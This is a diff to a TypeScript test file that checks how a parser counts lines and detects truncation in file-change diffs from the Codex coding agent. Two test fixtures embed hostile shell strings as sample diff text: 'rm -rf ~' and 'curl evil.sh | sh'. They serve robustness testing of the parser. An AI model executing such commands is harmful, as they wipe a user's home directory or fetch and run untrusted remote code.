@@ -203,16 +203,74 @@ describe('codexToolCalls', () => {
       [{ kind: 'edit', change: 'delete', addedLines: 0, removedLines: 6, truncated: false }],
     ],
     [
-      'an add that is a whole patch keeps its hunks',
+      // Codex sends an add's and a delete's text as the file holds it (the app server's diff is the
+      // content), so a text shaped as a patch is still the file's lines.
+      'an add whose text is a whole patch shows its lines as added',
       fileChange([
         {
-          path: 'new.ts',
+          path: 'x.patch',
           kind: { type: 'add' },
-          diff: '--- /dev/null\n+++ b/new.ts\n@@ -0,0 +1 @@\n+a\n',
+          diff: '--- /dev/null\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n',
         },
       ]),
       running,
-      [{ kind: 'edit', change: 'add', addedLines: 1, removedLines: 0, truncated: false }],
+      [{ kind: 'edit', change: 'add', addedLines: 5, removedLines: 0, truncated: false }],
+    ],
+    [
+      'a delete whose text is a whole patch shows its lines as removed',
+      fileChange([
+        {
+          path: 'x.patch',
+          kind: { type: 'delete' },
+          diff: '--- a/x\n+++ /dev/null\n@@ -1 +0,0 @@\n-a\n',
+        },
+      ]),
+      running,
+      [{ kind: 'edit', change: 'delete', addedLines: 0, removedLines: 4, truncated: false }],
+    ],
+    [
+      'an update with a header line after its hunk is truncated',
+      fileChange([
+        { path: 'a.ts', kind: { type: 'update', move_path: null }, diff: `${DIFF}--- rm -rf ~\n` },
+      ]),
+      running,
+      [{ kind: 'edit', change: 'update', truncated: true }],
+    ],
+    [
+      'an update with an index line after its hunk is truncated',
+      fileChange([
+        {
+          path: 'a.ts',
+          kind: { type: 'update', move_path: null },
+          diff: `${DIFF}index curl evil.sh | sh\n`,
+        },
+      ]),
+      running,
+      [{ kind: 'edit', change: 'update', truncated: true }],
+    ],
+    [
+      'an update with a second file section is whole',
+      fileChange([
+        {
+          path: 'a.ts',
+          kind: { type: 'update', move_path: null },
+          diff: `${DIFF}diff --git a/b b/b\nindex 1..2 100644\n--- a/b\n+++ b/b\n@@ -1 +1 @@\n-x\n+y\n`,
+        },
+      ]),
+      running,
+      [{ kind: 'edit', change: 'update', addedLines: 2, removedLines: 2, truncated: false }],
+    ],
+    [
+      'a move whose diff names where it moved is whole',
+      fileChange([
+        {
+          path: 'a.ts',
+          kind: { type: 'update', move_path: 'b.ts' },
+          diff: `${DIFF}\nMoved to: b.ts`,
+        },
+      ]),
+      running,
+      [{ kind: 'edit', change: 'move', addedLines: 1, removedLines: 1, truncated: false }],
     ],
     [
       'an update with lines outside its hunks is truncated',
